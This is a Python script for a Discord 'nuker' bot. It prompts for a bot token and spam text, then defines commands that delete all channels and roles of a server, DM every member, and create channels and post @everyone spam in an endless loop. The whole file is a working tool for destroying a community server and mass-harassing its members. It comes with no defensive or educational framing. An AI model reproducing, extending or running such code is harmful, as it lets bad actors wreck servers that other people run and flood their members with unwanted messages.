import discord 
from discord.ext import commands
from discord.utils import get
from colorama import Fore
import os

r = Fore.MAGENTA

print(f"""{r}
███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ \n████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗\n██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝\n██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗\n██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║\n╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{r}-------------------------------------------\n{r}| {r}sumzum#1827 {r}|{r} https://github.com/sumzum |{r}\n{r}-------------------------------------------\n
{r}""")

TOKEN = input("Input Bot Token: ")
SPAM_MESSAGE = input("Input your Spam Message: ")
DM_ALL = input("Dm Message for all Members: ")

bot = commands.Bot(command_prefix="!" ,help_command=None, intents=discord.Intents.all())
bot.remove_command('help')

@bot.event
async def on_ready():
    print(Fore.MAGENTA + """
Bot is Online!

Commands:
1. !delroles (deletes all roles)
2. !spamchannel (input message after command)
3. !dmall (dm all server members)
4. !delchannels (deletes all channels)
""")

@bot.command()
async def delchannels(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
     await channel.delete()    

@bot.command()
async def delroles(ctx):
 for role in ctx.guild.roles:  
     try:  
        await role.delete()
     except:
        print(Fore.MAGENTA + f"Cannot delete {role.name}")

@bot.command()
async def dmall(ctx, *, message):
        for user in ctx.guild.members:
            try:
                await user.send(message)
            except:
                 print(Fore.MAGENTA + f"Cannot DM{user.name}")

@bot.command()
async def spamchannel(ctx, arg: str):
    allowed_mentions = discord.AllowedMentions(everyone = True)
    guild = ctx.message.guild
    while True:
        channel = await guild.create_text_channel(arg)
        await channel.send(content = SPAM_MESSAGE, allowed_mentions = allowed_mentions)

bot.run(TOKEN) 
